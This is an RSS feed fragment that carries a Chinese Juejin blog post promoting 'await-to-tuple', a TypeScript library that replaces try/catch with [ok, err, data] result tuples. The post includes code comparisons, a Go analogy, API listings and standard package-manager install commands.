</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 try/catch 地狱：用三元组重新定义 JavaScript 错误处理]]></title>    <link>https://juejin.cn/post/7583970267133378566</link>    <guid>https://juejin.cn/post/7583970267133378566</guid>    <pubDate>2025-12-16T03:43:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583970267133378566" data-draft-id="7583980250734002239" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 try/catch 地狱：用三元组重新定义 JavaScript 错误处理"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-12-16T03:43:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CoderHing"/> <meta itemprop="url" content="https://juejin.cn/user/1992782705853159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 try/catch 地狱：用三元组重新定义 JavaScript 错误处理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1992782705853159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CoderHing
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:43:53.000Z" title="Tue Dec 16 2025 03:43:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">告别 try/catch 地狱：用三元组重新定义 JavaScript 错误处理</h2>
<blockquote>
<p>写了五年前端，我终于受够了 try/catch。</p>
</blockquote>
<h3 data-id="heading-1">一个真实的场景</h3>
<p>上周重构一个老项目，打开一个文件，200 行代码里有 47 行是 try/catch。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadDashboard</span>(<span class="hljs-params">userId</span>) {
  <span class="hljs-keyword">let</span> user;
  <span class="hljs-keyword">try</span> {
    user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(userId);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取用户失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> posts;
  <span class="hljs-keyword">try</span> {
    posts = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchPosts</span>(user.<span class="hljs-property">id</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取文章失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> comments;
  <span class="hljs-keyword">try</span> {
    comments = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchComments</span>(posts[<span class="hljs-number">0</span>].<span class="hljs-property">id</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取评论失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-title function_">render</span>(user, posts, comments);
}
</code></pre>
<p>看着这坨代码，我问自己：<strong>这真的是 2024 年该有的写法吗？</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 😵 典型的 try/catch 地狱</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">processOrder</span>(<span class="hljs-params">orderId</span>) {
  <span class="hljs-keyword">let</span> order;
  <span class="hljs-keyword">try</span> {
    order = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchOrder</span>(orderId);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取订单失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> user;
  <span class="hljs-keyword">try</span> {
    user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(order.<span class="hljs-property">userId</span>);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取用户失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> payment;
  <span class="hljs-keyword">try</span> {
    payment = <span class="hljs-keyword">await</span> <span class="hljs-title function_">processPayment</span>(order, user);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'支付处理失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> shipping;
  <span class="hljs-keyword">try</span> {
    shipping = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createShipping</span>(order, user);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'创建物流失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">let</span> notification;
  <span class="hljs-keyword">try</span> {
    notification = <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendNotification</span>(user, order);
  } <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'发送通知失败'</span>, e);
    <span class="hljs-keyword">return</span>;
  }

  <span class="hljs-keyword">return</span> { order, payment, shipping, notification };
}
<span class="hljs-comment">// 50+ 行代码，真正的业务逻辑只有 5 行</span>
</code></pre>
<h3 data-id="heading-2">问题出在哪？</h3>
<p>try/catch 本身没错，但它有几个让人难受的地方：</p>
<p><strong>1. 打断思维流</strong></p>
<p>正常逻辑和错误处理交织在一起，读代码时要不断切换上下文。</p>
<p><strong>2. 变量作用域问题</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">let</span> data;
<span class="hljs-keyword">try</span> {
  data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>();
} <span class="hljs-keyword">catch</span> (e) {
  <span class="hljs-comment">// ...</span>
}
<span class="hljs-comment">// data 可能是 undefined，TypeScript 也帮不了你</span>
</code></pre>
<p><strong>3. 无法优雅组合</strong></p>
<p>想把多个异步操作串起来？要么嵌套，要么一堆临时变量。</p>
<p><strong>4. 错误类型丢失</strong></p>
<p>catch 里的 <code>e</code> 是 <code>unknown</code>，每次都要手动判断类型。</p>
<h3 data-id="heading-3">Go 语言给的启发</h3>
<p>Go 程序员处理错误的方式很不一样：</p>
<pre><code class="hljs language-go" lang="go">user, err := fetchUser(id)
<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
    <span class="hljs-keyword">return</span> err
}
</code></pre>
<p>错误不是被"抛出"的，而是作为返回值的一部分。这种方式有个好处：<strong>错误处理变成了数据流的一部分</strong>，而不是控制流的中断。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-comment">// ✅ Go 风格：错误是值，不是异常</span>
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">processOrder</span><span class="hljs-params">(orderId <span class="hljs-type">string</span>)</span></span> (*Result, <span class="hljs-type">error</span>) {
    order, err := fetchOrder(orderId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"获取订单失败: %w"</span>, err)
    }

    user, err := fetchUser(order.UserId)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"获取用户失败: %w"</span>, err)
    }

    payment, err := processPayment(order, user)
    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"支付处理失败: %w"</span>, err)
    }

    <span class="hljs-keyword">return</span> &amp;Result{Order: order, User: user, Payment: payment}, <span class="hljs-literal">nil</span>
}
<span class="hljs-comment">// 逻辑清晰，错误处理紧跟调用，一目了然</span>
</code></pre>
<h3 data-id="heading-4">把这个思路搬到 JavaScript</h3>
<p>我写了一个小工具库 <code>await-to-tuple</code>，核心思想很简单：</p>
<p><strong>把 Promise 的结果包装成 <code>[ok, error, data]</code> 三元组。</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取用户失败:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// TypeScript 知道这里 user 一定有值</span>
</code></pre>
<h4 data-id="heading-5">为什么是三元组？</h4>
<p>你可能见过 <code>await-to-js</code> 这个库，它返回 <code>[err, data]</code>。但这有个问题：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> [err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());

<span class="hljs-comment">// 如果 data 本身就是 undefined 或 null 呢？</span>
<span class="hljs-comment">// 你分不清是"成功但值为空"还是"失败了"</span>
</code></pre>
<p>三元组通过第一个布尔值 <code>ok</code> 明确区分成功和失败：</p>























<table><thead><tr><th>ok</th><th>err</th><th>data</th><th>含义</th></tr></thead><tbody><tr><td>true</td><td>null</td><td>值</td><td>成功</td></tr><tr><td>false</td><td>Error</td><td>null</td><td>失败</td></tr></tbody></table>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ❌ 二元组的问题：await-to-js 风格</span>
<span class="hljs-keyword">const</span> [err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());
<span class="hljs-keyword">if</span> (err) { <span class="hljs-comment">/* 处理错误 */</span> }
<span class="hljs-comment">// 问题：如果 API 返回 null 或 undefined 怎么办？</span>
<span class="hljs-comment">// data 为空到底是"成功但值为空"还是"失败了"？</span>

<span class="hljs-comment">// ✅ 三元组的优势：await-to-tuple 风格</span>
<span class="hljs-keyword">const</span> [ok, err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>());
<span class="hljs-keyword">if</span> (!ok) { <span class="hljs-comment">/* 一定是失败 */</span> }
<span class="hljs-comment">// ok 明确告诉你成功还是失败，不存在歧义</span>

<span class="hljs-comment">// 对比表：</span>
<span class="hljs-comment">// | ok    | err   | data | 含义           |</span>
<span class="hljs-comment">// |-------|-------|------|----------------|</span>
<span class="hljs-comment">// | true  | null  | 值   | 成功，有数据   |</span>
<span class="hljs-comment">// | true  | null  | null | 成功，值为空   |</span>
<span class="hljs-comment">// | false | Error | null | 失败           |</span>
</code></pre>
<h3 data-id="heading-6">实际效果</h3>
<p>还记得开头那 47 行代码吗？用 <code>await-to-tuple</code> 重写：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadDashboard</span>(<span class="hljs-params">userId: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-keyword">const</span> [ok1, err1, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(userId));
  <span class="hljs-keyword">if</span> (!ok1) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取用户失败:'</span>, err1.<span class="hljs-property">message</span>);

  <span class="hljs-keyword">const</span> [ok2, err2, posts] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchPosts</span>(user.<span class="hljs-property">id</span>));
  <span class="hljs-keyword">if</span> (!ok2) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取文章失败:'</span>, err2.<span class="hljs-property">message</span>);

  <span class="hljs-keyword">const</span> [ok3, err3, comments] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchComments</span>(posts[<span class="hljs-number">0</span>].<span class="hljs-property">id</span>));
  <span class="hljs-keyword">if</span> (!ok3) <span class="hljs-keyword">return</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'获取评论失败:'</span>, err3.<span class="hljs-property">message</span>);

  <span class="hljs-title function_">render</span>(user, posts, comments);
}
</code></pre>
<p><strong>从 47 行变成 12 行。</strong> 逻辑清晰，错误处理紧跟在调用后面，一目了然。</p>
<h3 data-id="heading-7">类型安全是重点</h3>
<p><code>await-to-tuple</code> 完全用 TypeScript 写的，类型推导非常准确：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-comment">// 这里 TypeScript 知道：</span>
  <span class="hljs-comment">// - err 是 SafeError（非 null）</span>
  <span class="hljs-comment">// - user 是 null</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-comment">// 这里 TypeScript 知道：</span>
<span class="hljs-comment">// - err 是 null</span>
<span class="hljs-comment">// - user 是 User 类型（非 null）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>); <span class="hljs-comment">// ✅ 不会报错</span>
</code></pre>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// TypeScript 类型收窄演示</span>
<span class="hljs-keyword">const</span> [ok, err, user] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchUser</span>(id));
<span class="hljs-comment">//    ^ok: boolean</span>
<span class="hljs-comment">//         ^err: SafeError | null</span>
<span class="hljs-comment">//              ^user: User | null</span>

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-comment">// ✅ 这个分支里 TypeScript 自动推断：</span>
  <span class="hljs-comment">// err: SafeError (非 null，可以安全访问 .message)</span>
  <span class="hljs-comment">// user: null</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">message</span>);  <span class="hljs-comment">// ✅ 不报错</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);      <span class="hljs-comment">// ❌ 报错：user 是 null</span>
  <span class="hljs-keyword">return</span>;
}

<span class="hljs-comment">// ✅ 这个分支里 TypeScript 自动推断：</span>
<span class="hljs-comment">// err: null</span>
<span class="hljs-comment">// user: User (非 null，可以安全访问属性)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user.<span class="hljs-property">name</span>);        <span class="hljs-comment">// ✅ 不报错</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err.<span class="hljs-property">message</span>);      <span class="hljs-comment">// ❌ 报错：err 是 null</span>
</code></pre>
<h3 data-id="heading-8">不只是异步</h3>
<p>同步代码也能用：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { sync } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-keyword">const</span> [ok, err, config] = <span class="hljs-title function_">sync</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(jsonString));

<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'JSON 解析失败:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">getDefaultConfig</span>();
}

<span class="hljs-keyword">return</span> config;
</code></pre>
<h3 data-id="heading-9">还有一些实用工具</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to, or, map, pipe } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// 失败时用默认值</span>
<span class="hljs-keyword">const</span> name = <span class="hljs-title function_">or</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchName</span>()), <span class="hljs-string">'匿名用户'</span>);

<span class="hljs-comment">// 转换成功的结果</span>
<span class="hljs-keyword">const</span> upperName = <span class="hljs-title function_">map</span>(<span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetchName</span>()), <span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n.<span class="hljs-title function_">toUpperCase</span>());

<span class="hljs-comment">// 链式调用，遇到错误自动中断</span>
<span class="hljs-keyword">const</span> [ok, err, result] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">pipe</span>(
  userId,
  fetchUser,
  validateUser,
  saveUser
);
</code></pre>
<h3 data-id="heading-10">和其他方案的对比</h3>






























<table><thead><tr><th>方案</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>try/catch</td><td>原生支持</td><td>冗长、打断逻辑、类型不安全</td></tr><tr><td>await-to-js</td><td>简洁</td><td>二元组有歧义</td></tr><tr><td><strong>await-to-tuple</strong></td><td>三元组无歧义、类型安全、工具丰富</td><td>需要安装依赖</td></tr><tr><td>TC39 try 操作符提案</td><td>语言原生</td><td>还在 Stage 1，遥遥无期</td></tr></tbody></table>
<h3 data-id="heading-11">立即开始</h3>
<h4 data-id="heading-12">安装</h4>
<p>选择你喜欢的包管理器：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># npm</span>
npm install await-to-tuple

<span class="hljs-comment"># pnpm（推荐）</span>
pnpm add await-to-tuple

<span class="hljs-comment"># yarn</span>
yarn add await-to-tuple
</code></pre>
<h4 data-id="heading-13">基础用法</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { to, sync } <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// 异步操作</span>
<span class="hljs-keyword">const</span> [ok, err, data] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/users'</span>));
<span class="hljs-keyword">if</span> (!ok) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'请求失败:'</span>, err.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);

<span class="hljs-comment">// 同步操作</span>
<span class="hljs-keyword">const</span> [ok2, err2, json] = <span class="hljs-title function_">sync</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(str));
<span class="hljs-keyword">if</span> (!ok2) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'解析失败:'</span>, err2.<span class="hljs-property">message</span>);
  <span class="hljs-keyword">return</span>;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(json);
</code></pre>
<h4 data-id="heading-14">完整 API</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { 
  to,      <span class="hljs-comment">// 包装 Promise</span>
  sync,    <span class="hljs-comment">// 包装同步函数</span>
  or,      <span class="hljs-comment">// 获取值或默认值</span>
  map,     <span class="hljs-comment">// 转换成功结果</span>
  pipe,    <span class="hljs-comment">// 链式调用</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;

<span class="hljs-comment">// 别名也可以用</span>
<span class="hljs-keyword">import</span> { 
  go,        <span class="hljs-comment">// = to</span>
  safeAwait, <span class="hljs-comment">// = to</span>
  safeCall,  <span class="hljs-comment">// = sync</span>
  unwrapOr,  <span class="hljs-comment">// = or</span>
  safePipe,  <span class="hljs-comment">// = pipe</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'await-to-tuple'</span>;
</code></pre>
<h4 data-id="heading-15">零依赖，超轻量</h4>
<ul>
<li>📦 gzip 后 &lt; 1KB</li>
<li>🌳 完全 Tree-shakeable</li>
<li>🔷 100% TypeScript，类型完备</li>
<li>✅ 完整测试覆盖</li>
</ul>
<hr/>
<h3 data-id="heading-16">链接</h3>
<ul>
<li>📦 <strong>npm</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.npmjs.com%2Fpackage%2Fawait-to-tuple" target="_blank" title="https://www.npmjs.com/package/await-to-tuple" ref="nofollow noopener noreferrer">www.npmjs.com/package/awa…</a></li>
<li>🐙 <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fasdzbb123%2Fawait-to-tuple" target="_blank" title="https://github.com/asdzbb123/await-to-tuple" ref="nofollow noopener noreferrer">github.com/asdzbb123/a…</a></li>
</ul>
<hr/>
<h3 data-id="heading-17">写在最后</h3>
<p>错误处理不应该是代码里最丑的部分。</p>
<p><code>await-to-tuple</code> 不是什么革命性的东西，它只是把一个简单的想法——<strong>错误是值，不是异常</strong>——用最小的代码量实现出来。</p>
<p>如果你也受够了 try/catch，不妨试试。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> [ok, err, future] = <span class="hljs-keyword">await</span> <span class="hljs-title function_">to</span>(<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'更好的代码'</span>));
</code></pre>
<hr/>
<p><strong>如果这篇文章对你有帮助：</strong></p>
<ul>
<li>⭐ 给个 Star：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fasdzbb123%2Fawait-to-tuple" target="_blank" title="https://github.com/asdzbb123/await-to-tuple" ref="nofollow noopener noreferrer">github.com/asdzbb123/a…</a></li>
<li>📦 npm 安装试试：<code>npm install await-to-tuple</code></li>
<li>💬 有问题欢迎提 Issue</li>
</ul>
<p>让我们一起告别 try/catch 地狱 🎉</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue 3 源码项目结构详解]]></title>    <link>https://juejin.cn/post/7583992239102705716</link>    <guid>https://juejin.cn/post/7583992239102705716</guid>    <pubDate>2025-12-16T04:06:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239102705716" data-draft-id="7583971282892537908" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue 3 源码项目结构详解"/> <meta itemprop="keywords" content="Vue.js,前端"/> <meta itemprop="datePublished" 